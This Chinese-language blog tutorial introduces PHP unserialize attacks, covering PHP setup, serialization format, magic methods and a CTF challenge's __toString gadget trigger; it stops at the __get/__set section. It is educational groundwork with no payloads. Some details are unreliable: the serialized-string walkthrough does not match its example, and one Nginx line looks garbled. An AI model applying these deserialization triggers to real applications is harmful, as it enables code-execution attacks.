<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>php-unserialize | Zedsich's Blog</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/contact/"><span class="navItemTitle">Contact</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>php-unserialize</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-11-12T07:11:55.000Z" id="date"> 2023-11-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-11-17T07:19:00.392Z" id="updated"> 2023-11-17</time></div></span><br><span>Word Count: <div class="control">4.8k</div></span><br><span>Read Time: <div class="control">21 min</div></span></div></div><hr><div id="post-content"><h1 id="Unserialize-Intro"><a href="#Unserialize-Intro" class="headerlink" title="Unserialize Intro"></a>Unserialize Intro</h1><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>在<code>PHP</code>官网上下载<code>Zip</code></p>
<ul>
<li>download link: <a target="_blank" rel="noopener" href="https://windows.php.net/download#php-8.2">https://windows.php.net/download#php-8.2</a></li>
</ul>
<p>解压安装包，将解压后的目录路径加入环境变量<code>PATH</code>中，安装完成后可以使用<code>php -v</code>来查询</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Use-Apache"><a href="#Use-Apache" class="headerlink" title="Use Apache"></a>Use Apache</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install php libapache2-mod-php<br><span class="hljs-comment"># 安装完成后，需要重启Apache来重新加载php</span><br>sudo systemctl restart apache2<br></code></pre></td></tr></table></figure>
<h4 id="Use-Nginx"><a href="#Use-Nginx" class="headerlink" title="Use Nginx"></a>Use Nginx</h4><p>不像<code>Apache</code>，<code>Nginx</code>没有对处理<code>PHP</code>文件的内建支持。我们要使用<code>PHP-FPM (“fastCGI process manager”)</code>来处理<code>PHP</code>文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install php-fpm<br><span class="hljs-comment"># 安装完成，FPM 服务将会自动启动</span><br><span class="hljs-comment"># 检查服务状态</span><br>systemctl status php7.4-fpm<br><span class="hljs-comment"># 然后对Nginx进行配置</span><br><span class="hljs-comment"># 添加以下内容来让Nginx处理PHP文件</span><br>server {<br><br>    <span class="hljs-comment"># ...</span><br><br>    location ~ \.php$ {<br>        include snippets/fastcgi-php.conf;<br>        fastcgi_pass unix:q;<br>    }<br>}<br><span class="hljs-comment"># 重启Nginx来使新配置生效</span><br>sudo systemctl restart nginx<br></code></pre></td></tr></table></figure>
<p>除了上述的这些方法，诸如<code>PhpStorm</code>，<code>phpstudy</code>，<code>VSC extensions</code>等等工具也是不错的选择</p>
<p>当然，也可以使用<code>Docker</code></p>
<h2 id="Class-amp-Object"><a href="#Class-amp-Object" class="headerlink" title="Class & Object"></a>Class &amp; Object</h2><p>在学习<code>PHP Unserialize Attack</code>之前，首先需要对<code>PHP</code>本身有所了解。<code>PHP</code>是一种面向对象的语言，和其他面向对象的语言一样，</p>
<ul>
<li><p><strong>对象</strong>是一个<strong>由信息及对信息进行处理的描述</strong>所组成的整体，是对现实世界的抽象。</p>
</li>
<li><p><strong>类</strong>是一个<strong>共享相同结构和行为的对象</strong>的集合。</p>
</li>
</ul>
<p>在<code>PHP</code>中，类内的属性或方法也有<code>private</code>，<code>protected</code>，<code>public</code>，三种访问权限</p>
<ul>
<li><code>private</code>：私有的 , 类内自身可访问</li>
<li><code>protected</code>：受保护的 , 类内自身 , 其子类和父类可以访问</li>
<li><code>public</code>：公开的 , 任何地方都可以访问</li>
</ul>
<p>举一个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$price</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$weight</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-number">114</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;price = <span class="hljs-number">514</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;weight = <span class="hljs-number">1919810</span>;<br>    }<br>}<br><br><span class="hljs-variable">$cargo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cargo</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$cargo</span>); <span class="hljs-comment">// var_dump()方法是判断一个变量的类型与长度，并输出变量的数值，如果变量有值输的是变量的值并回返数据类型</span><br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">// output</span><br><span class="hljs-keyword">object</span>(Cargo)<span class="hljs-comment">#1 (3) {</span><br>  [<span class="hljs-string">"id"</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">114</span>)<br>  [<span class="hljs-string">"price"</span>:<span class="hljs-keyword">protected</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">514</span>)<br>  [<span class="hljs-string">"weight"</span>:<span class="hljs-string">"Cargo"</span>:<span class="hljs-keyword">private</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1919810</span>)<br>}<br></code></pre></td></tr></table></figure>
<h2 id="What-is-Serialize-amp-Unserialize"><a href="#What-is-Serialize-amp-Unserialize" class="headerlink" title="What is Serialize & Unserialize?"></a>What is Serialize &amp; Unserialize?</h2><p>由于传递对象十分麻烦，所以便诞生了<code>序列化</code>，在<code>PHP</code>中，我们可以使用<code>serialize()</code>来将一个对象转化成字符串，方便我们进行对象的传递。</p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-number">114514</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-number">1919810</span>;<br>    }<br>}<br><br><span class="hljs-variable">$cargo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cargo</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cargo</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// output</span><br>O:<span class="hljs-number">5</span>:<span class="hljs-string">"Cargo"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">2</span>:<span class="hljs-string">"id"</span>;i:<span class="hljs-number">114514</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;i:<span class="hljs-number">1919810</span>;}<br></code></pre></td></tr></table></figure>
<p>我们来详细解释一下这个字符串</p>
<ul>
<li><code>O:5:"Cargo":3</code>：<code>O</code>表示是一个对象，<code>5</code>表示类名的长度，<code>Cargo</code>是类名，<code>3</code>代表在<code>Cargo</code>这个类中有三个属性，而这三个属性也是后面<code>{}</code>之中的内容</li>
<li><code>{s:2:"id";i:114;s:8:"price";i:514;s:13:"Cargoweight";i:1919810;}</code>：不同的属性之间用<code>;</code>隔开，<code>s:2:"id";i:114</code>代表这个属性名长度为2，属性名为<code>id</code>，而其内容是<code>int</code>类型的<code>114</code></li>
</ul>
<p>有序列化也同样会有反序列化，我们可以使用<code>unserialize()</code>来将一个字符串反序列化为一个对象</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-number">114514</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-number">1919810</span>;<br>    }<br>}<br><br><span class="hljs-variable">$string</span> = <span class="hljs-string">'O:5:"Cargo":2:{s:2:"id";i:114514;s:4:"name";i:1919810;}'</span>;<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$string</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// output</span><br><span class="hljs-keyword">object</span>(Cargo)<span class="hljs-comment">#1 (2) {</span><br>  [<span class="hljs-string">"id"</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">114514</span>)<br>  [<span class="hljs-string">"name"</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1919810</span>)<br>}<br></code></pre></td></tr></table></figure>
<h2 id="Magic-Functions"><a href="#Magic-Functions" class="headerlink" title="Magic Functions"></a>Magic Functions</h2><blockquote>
<p>魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。</p>
<p>Reference Link: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup</a></p>
</blockquote>
<p>魔术方法一共有如下这些</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()	<span class="hljs-comment">// 类的构造函数，创建对象时触发</span><br><span class="hljs-title function_ invoke__">__destruct</span>()    <span class="hljs-comment">// 类的析构函数，对象被销毁时触发</span><br><span class="hljs-title function_ invoke__">__call</span>()        <span class="hljs-comment">// 在对象上下文中调用不可访问的方法时触发</span><br><span class="hljs-title function_ invoke__">__callStatic</span>()  <span class="hljs-comment">// 在静态上下文中调用不可访问的方法时触发</span><br><span class="hljs-title function_ invoke__">__get</span>()         <span class="hljs-comment">// 读取不可访问属性的值时，这里的不可访问包含私有属性或未定义</span><br><span class="hljs-title function_ invoke__">__set</span>()         <span class="hljs-comment">// 在给不可访问属性赋值时触发</span><br><span class="hljs-title function_ invoke__">__isset</span>()       <span class="hljs-comment">// 当对不可访问属性调用isset()或empty()时触发</span><br><span class="hljs-title function_ invoke__">__unset</span>()       <span class="hljs-comment">// 在不可访问的属性上使用unset()时触发</span><br><span class="hljs-title function_ invoke__">__sleep</span>()       <span class="hljs-comment">// 执行serialize()时，先会调用这个方法</span><br><span class="hljs-title function_ invoke__">__wakeup</span>()      <span class="hljs-comment">// 执行unserialize()时，先会调用这个方法</span><br><span class="hljs-title function_ invoke__">__serialize</span>()   <span class="hljs-comment">// </span><br><span class="hljs-title function_ invoke__">__unserialize</span>() <span class="hljs-comment">// </span><br><span class="hljs-title function_ invoke__">__toString</span>()    <span class="hljs-comment">// 把类当作字符串使用时触发</span><br><span class="hljs-title function_ invoke__">__invoke</span>()      <span class="hljs-comment">// 当尝试以调用函数的方式调用一个对象时触发</span><br><span class="hljs-title function_ invoke__">__set_state</span>()   <span class="hljs-comment">// 调用var_export()导出类时，此静态方法会被调用。</span><br><span class="hljs-title function_ invoke__">__clone</span>()       <span class="hljs-comment">// 当对象复制完成时调用</span><br><span class="hljs-title function_ invoke__">__debuginfo</span>()   <span class="hljs-comment">// 打印调试信息</span><br></code></pre></td></tr></table></figure>
<p>有一些注意事项：</p>
<ul>
<li><p>除了<code>__construct()</code>，<code>__destruct()</code>，和 <code>__clone()</code>之外的所有魔术方法都必须 声明为<code>public</code>，否则会发出<code>E_WARNING</code>。在<code>PHP 8.0.0</code>之前没有为魔术方法<code>__sleep()</code>、<code>__wakeup()</code>，<code>__serialize()</code>，<code>__unserialize()</code>，<code>__set_state()</code>发出诊断信息。</p>
</li>
<li><p><code>__construct()</code>，<code>__destruct()</code>不能声明返回类型，不然会返回<code>Fatal Error</code></p>
</li>
</ul>
<h3 id="sleep-amp-wakeup"><a href="#sleep-amp-wakeup" class="headerlink" title="__sleep() & __wakeup()"></a>__sleep() &amp; __wakeup()</h3><p>我们先看一下下面这个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$hidden</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-number">114514</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;hidden = <span class="hljs-number">1919810</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">"zako"</span>;<br>    }<br>}<br><br><span class="hljs-variable">$cargo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cargo</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cargo</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// output</span><br>O:<span class="hljs-number">5</span>:<span class="hljs-string">"Cargo"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">13</span>:<span class="hljs-string">"Cargosecret"</span>;i:<span class="hljs-number">114514</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">"*hidden"</span>;i:<span class="hljs-number">1919810</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"zako"</span>;}<br></code></pre></td></tr></table></figure>
<p>我们会发现，在序列化的过程中，类内的<code>private</code>和<code>protected</code>属性也被序列化了，如果我们不希望某些属性在序列化时被暴露出来，就可以借用<code>__sleep()</code>方法</p>
<blockquote>
<p><code>__sleep()</code>方法是<code>PHP</code>中的一个魔术方法，用于在对象被序列化时触发。在<code>__sleep()</code>中，我们可以指定哪些属性需要被序列化，哪些属性不需要被序列化。具体来说，当调用<code>serialize()</code>函数将一个对象序列化时，<code>PHP</code>会先自动调用对象的<code>__sleep()</code>方法，该方法需要返回一个数组，包含需要被序列化的属性名。然后<code>PHP</code>会将这些属性序列化成字符串。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cargo</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$hidden</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-number">114514</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;hidden = <span class="hljs-number">1919810</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">"zako"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>{	<span class="hljs-comment">// 在这里，我们添加__sleep()，并让它返回一个仅包含"name"的数组</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">"name"</span>);<br>    }<br><br>}<br><br><span class="hljs-variable">$cargo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cargo</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cargo</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// output</span><br>O:<span class="hljs-number">5</span>:<span class="hljs-string">"Cargo"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"zako"</span>;}	<span class="hljs-comment">// 可以看到，此时序列化之后的字符串中就不会包括我们不想暴露的"secret"和"hidden"了</span><br></code></pre></td></tr></table></figure>
<p>显然，睡着了需要醒过来（bushi</p>
<blockquote>
<p>在对字符串进行反序列化时会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用<code>__wakeup()</code>方法，预先准备对象需要的资源 而<code>__wakeup()</code> 用于在从字符串反序列化为对象时自动调用。</p>
<p><code>__wakeup()</code> 方法的作用是对一个对象进行一些必要的初始化操作。例如，如果一个对象中包含了一些需要进行身份验证的属性，那么在从字符串反序列化为对象时，就可以在 <code>__wakeup()</code> 方法中进行身份验证。或者如果一个对象中包含了一些需要在每次初始化时计算的属性，也可以在 <code>__wakeup()</code> 方法中进行计算</p>
</blockquote>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><blockquote>
<p><code>__toString()</code>方法用于一个类被当成字符串时应怎样回应，此方法必须返回一个字符串</p>
</blockquote>
<p>其实，<code>__toString()</code>方法被触发的情况很多</p>
<ul>
<li><code>echo($obj), print($obj)</code></li>
<li>反序列化对象与字符串拼接</li>
<li>反序列化对象参与格式化字符串</li>
<li>反序列化对象与字符串进行值相同（==）比较</li>
<li>反序列化对象参与格式化<code>SQL</code>语句，绑定参数</li>
<li>反序列化对象被用于字符串处理函数<ul>
<li><code>strlen()</code>，<code>strcmp()</code></li>
<li>需要格外注意，正则判断<code>preg_match()</code>也会触发</li>
</ul>
</li>
<li>在<code>in_array()</code>方法中，第一个参数时反序列化对象，第二个参数的数组中有<code>__toString()</code>返回的字符串</li>
<li>反序列化对象作为<code>class_exists()</code>的参数</li>
</ul>
<p>举个例子，这次招新赛的<code>！动启，案档蓝蔚</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Blue</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Printer</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span>=<span class="hljs-string">"还想找大叔玩？&lt;br&gt;"</span></span>)</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"word count:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-variable">$content</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">print</span>();<br>    }<br>}<br></code></pre></td></tr></table></figure>
<p>在这里就是通过<code>Printer</code>类的<code>__construct()</code>方法，将<code>$content</code>传参一个<code>Blue</code>类的对象，从而通过<code>strlen()</code>触发<code>__toString()</code></p>
<h3 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get() & __set()"></a>__get() &amp; __set()</h3><blockquote>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<code>__get()</code>会被调用。</p>
<p>在给不可访问（protected 或 private）或不存在的属性赋值时，<code>__set()</code>会被调用。</p>
</blockquote>
<p>还是参照这次招新赛的<code>！动启，案档蓝蔚</code></p>
